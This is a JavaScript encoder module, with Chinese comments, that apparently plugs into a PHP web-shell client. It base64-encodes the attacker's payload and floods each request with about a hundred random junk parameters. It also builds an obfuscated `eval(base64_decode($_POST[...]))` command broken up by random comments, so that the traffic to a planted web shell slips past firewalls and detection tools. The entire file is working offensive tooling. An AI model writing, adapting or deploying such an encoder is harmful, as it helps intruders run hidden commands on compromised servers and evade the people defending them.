/**
 * php::2022最新 Base64编码器
 * Create at: 2022
 */

'use strict';

/*
* @param  {String} pwd   连接密码
* @param  {Array}  data  编码器处理前的 payload 数组
* @return {Array}  data  编码器处理后的 payload 数组
*/
module.exports = (pwd, data, ext={}) => {
  // ##########    请在下方编写你自己的代码   ###################
  // 以下代码为 PHP Base64 样例
function ranStr(e,pwd,model) {    
    e = e || 32;
    var t='';
    if(model=='v'){
      t = "ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz012345678_/=+%";
    }
    else{
      t = "ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz012345678";
    }
    let a = t.length,
    n = "";
    while (true){
      for (let i = 0; i < e; i++) n += t.charAt(Math.floor(Math.random() * a));
      if(n != pwd){
        break;
      }
    }
    return n
}
function randomNum(minNum,maxNum){ 
  let num=0;
  switch(arguments.length){ 
    case 1: 
    num = parseInt(Math.random()*minNum+1); 
  break; 
    case 2: 
    num = parseInt(Math.random()*(maxNum-minNum+1)+minNum); 
    break; 
  default: 
    num = 0; 
    break; 
  } 
  return num;
}
function randZ(){
  return '/*'+ranStr(randomNum(2,9),pwd,'k')+'*/';
}
  // 生成一个随机变量名
  var aaa = 100;
  for(let i=0;i<aaa;i++){
    data[ranStr(randomNum(2,9),pwd,'k')]=ranStr(randomNum(50,200),pwd,'v');
  }
  let randomID = 'z'+`${Math.random().toString(16).substr(2)}`;
  data[randomID] = new Buffer(data['_']).toString('base64');
  data[pwd] = new Buffer(randZ()+`eval(${randZ()}base64_decode${randZ()}(${randZ()}$_POST[${randomID}]));die();`+randZ()).toString('base64');
  delete data['_'];
  return data;

}